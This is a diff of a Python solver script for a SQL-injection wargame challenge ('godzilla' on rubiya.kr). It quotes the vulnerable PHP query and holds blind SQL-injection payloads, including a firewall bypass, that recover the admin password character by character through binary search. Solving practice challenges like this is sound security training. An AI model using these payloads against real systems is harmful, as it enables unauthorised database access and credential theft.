@@ -7,31 +7,30 @@ def check_func(*args) -> bool:
     check string in response of request
     args[0]: response
     '''
-    return 'select id from prob_dark_eyes' in args[0]
+    return 'Hello admin' in args[0]
 
 
 def main():
     '''
-    Dark_eyes
+    Godzilla
 
+    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
     if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
-    if(preg_match('/col|if|case|when|sleep|benchmark/i', $_GET[pw])) exit("HeHe");
-    $query = "select id from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
-    $result = @mysqli_fetch_array(mysqli_query($db,$query));
-    if(mysqli_error($db)) exit();
+    $query = "select id from prob_godzilla where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
     echo "<hr>query : <strong>{$query}</strong><hr><br>";
+    $result = @mysqli_fetch_array(mysqli_query($db,$query));
+    if($result['id']) echo "<h2>Hello admin</h2>";
 
     $_GET[pw] = addslashes($_GET[pw]);
-    $query = "select pw from prob_dark_eyes where id='admin' and pw='{$_GET[pw]}'";
+    $query = "select pw from prob_godzilla where id='admin' and pw='{$_GET[pw]}'";
     $result = @mysqli_fetch_array(mysqli_query($db,$query));
-    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("dark_eyes");
+    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("godzilla");
     '''
 
-    url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
+    url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php"
     cook = los.check_cookies(url)
 
-    payload = "'||id='admin'&&(select 1 union select (length(pw)>%s))#"
-    param = dict(pw=payload)
+    param = dict(id="-1'<@=1||id='admin'&&length(pw)>%s||'", pw='a')
     len_of_key = los.find_key_len(url, param, check_func, cook)
 
     print(len_of_key)
@@ -39,8 +38,8 @@ def main():
     result = ''
     num_of_requests = 0
     for i in range(1, len_of_key + 1):
-        payload = f"'||id='admin'&&(select 1 union select (ord(mid(pw,{i},1))<%s))#"
-        param = dict(pw=payload)
+        payload = f"-1'<@=1||id='admin'&&ord(mid(pw,{i},1))<%s||'"
+        param = dict(id=payload, pw='a')
         left, num_requests = los.find_binary(url, param, check_func,
                                              32, 127, cook)
         print(chr(left))
@@ -53,7 +52,7 @@ def main():
     response = los.get_request(url, param, cook)
 
     if 'Clear!' in response:
-        print('Dark_eyes Clear!')
+        print('Godzilla Clear!')
 
 
 if __name__ == '__main__':
